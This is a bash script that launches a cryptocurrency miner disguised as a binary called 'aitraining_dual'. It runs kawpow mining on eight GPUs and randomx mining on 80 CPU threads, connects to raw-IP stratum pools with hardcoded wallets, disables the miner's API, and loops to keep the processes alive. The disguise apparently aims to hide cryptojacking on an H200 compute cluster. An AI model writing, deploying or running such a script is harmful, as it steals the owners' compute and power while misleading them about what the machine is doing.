#!/bin/bash
set -e

echo "=== Cleaning old processes ==="
pkill -f aitraining_dual 2>/dev/null || true
sleep 2

mkdir -p logs

echo "=== Starting GPU process ==="

./aitraining_dual \
    --algorithm kawpow \
    --pool stratum+ssl://51.89.99.172:16161 \
    --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
    --worker H200-g \
    --password x \
    --gpu-id 0,1,2,3,4,5,6,7 \
    --tls true \
    --disable-cpu \
    --api-disable &

GPU_PID=$!

echo "=== Starting CPU process ==="

./aitraining_dual \
    --algorithm randomx \
    --pool stratum+ssl://51.222.200.133:10343 \
    --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
    --worker H200-c \
    --password x \
    --cpu-threads 80 \
    --disable-gpu \
    --tls true \
    --api-disable &

CPU_PID=$!

echo "=== Monitoring ==="
while true; do
    echo "[$(date)] running..."
    ps -p $GPU_PID $CPU_PID
    sleep 30
done

